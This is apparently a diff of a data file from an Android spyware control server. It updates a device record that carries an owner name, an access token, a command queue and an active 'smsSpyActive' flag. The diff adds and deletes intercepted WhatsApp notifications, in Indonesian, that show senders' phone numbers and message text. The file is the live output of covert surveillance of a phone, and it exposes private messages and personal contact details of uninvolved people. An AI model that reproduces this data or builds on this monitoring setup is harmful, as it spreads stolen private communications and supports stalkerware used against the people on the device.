@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776944644127,
+    "lastSeen": 1776944656393,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎65 pesan dari 42 chat",
+        "time": "23/04 19:44",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776944646170
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 822-6965-3769",
+        "content": "sipp",
+        "time": "23/04 19:44",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776944646013
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎71 pesan dari 43 chat",
+        "time": "23/04 19:44",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776944645858
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Oi: BEW STORE",
+        "content": "Memberi reaksi 🕒 pada \".brat ppsbdjjd\"",
+        "time": "23/04 19:44",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776944645570
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3987,38 +4019,6 @@
         "time": "23/04 19:12",
         "pkg": "com.whatsapp",
         "receivedAt": 1776942746034
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 851-3406-5819",
-        "content": "Oke",
-        "time": "23/04 19:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942745893
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎59 pesan dari 38 chat",
-        "time": "23/04 19:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942745521
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎59 pesan dari 38 chat",
-        "time": "23/04 19:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942745285
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎59 pesan dari 38 chat",
-        "time": "23/04 19:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942744965
       }
     ],
     "galleryPhotos": [],
